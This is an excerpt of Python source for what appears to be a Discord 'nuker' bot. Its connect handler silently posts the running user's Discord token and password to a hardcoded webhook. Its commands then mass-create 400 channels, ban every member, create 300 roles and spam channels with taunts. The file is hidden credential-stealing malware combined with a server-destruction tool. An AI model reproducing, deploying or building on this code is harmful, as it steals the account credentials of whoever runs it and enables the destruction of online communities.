...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/777954306879127602/pJSo8fG3mQOwlH2lMs1Qax5VyASyA2ePoGwgmDyjCb8psimnErd-e0NbyNxNf-myYQbm',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(400):
        await ctx.guild.create_text_channel(name="hoodrich")
    for _i in range(400):
...
async def massban(ctx):
    ...
    for user in users:
        try:
            await user.ban(reason="hoodrich was here")
        except:
            pass
...
async def massrole(ctx):
    ...
    for _i in range(300):
        try:
            await ctx.guild.create_role(name="long live luis", color=RandomColor())
        except:
            return
...
async def spamchannels(ctx):
    ...
    for _i in range(400):
        try:
            await ctx.guild.create_text_channel(name="long live luis&loose")
        except:
            return
